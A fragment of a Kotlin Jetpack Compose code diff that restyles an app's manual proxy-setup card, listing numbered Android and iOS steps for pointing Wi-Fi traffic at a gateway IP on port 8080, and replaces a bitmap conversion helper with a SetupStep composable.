-                    Text("Android: Settings → WiFi → long press network → Modify → Proxy Manual → $gatewayIp : 8080", fontSize = 11.sp, color = CgGray, lineHeight = 16.sp)
-                    Spacer(Modifier.height(4.dp))
-                    Text("iOS: Settings → WiFi → ⓘ → HTTP Proxy Manual → $gatewayIp : 8080", fontSize = 11.sp, color = CgGray, lineHeight = 16.sp)
-                }
+            CgCard {
+                Text("Manual Setup (if QR doesn't work)", fontSize = 12.sp, fontWeight = FontWeight.SemiBold, color = CgGray)
+                Spacer(Modifier.height(8.dp))
+                SetupStep(1, "Android: Settings → WiFi → long press network → Modify → Proxy Manual")
+                SetupStep(2, "Server: $gatewayIp  Port: 8080")
+                Spacer(Modifier.height(6.dp))
+                SetupStep(1, "iOS: Settings → WiFi → ⓘ → HTTP Proxy → Manual")
+                SetupStep(2, "Server: $gatewayIp  Port: 8080")
             }
         }
     }
 }
 
-// extension to convert Bitmap to ImageBitmap
-
-// correct bitmap → ImageBitmap conversion
-fun android.graphics.Bitmap.toComposeImageBitmap(): androidx.compose.ui.graphics.ImageBitmap {
-    return androidx.compose.ui.graphics.asImageBitmap(this)
+@Composable
+fun SetupStep(num: Int, text: String) {
+    Row(Modifier.padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
+        Box(Modifier.size(18.dp).clip(CircleShape).background(CgGreen.copy(0.15f)), contentAlignment = Alignment.Center) {
+            Text("$num", fontSize = 9.sp, color = CgGreen, fontWeight = FontWeight.Bold)
+        }
+        Spacer(Modifier.width(8.dp))
+        Text(text, fontSize = 11.sp, color = CgWhite, lineHeight = 16.sp)
+    }
 }
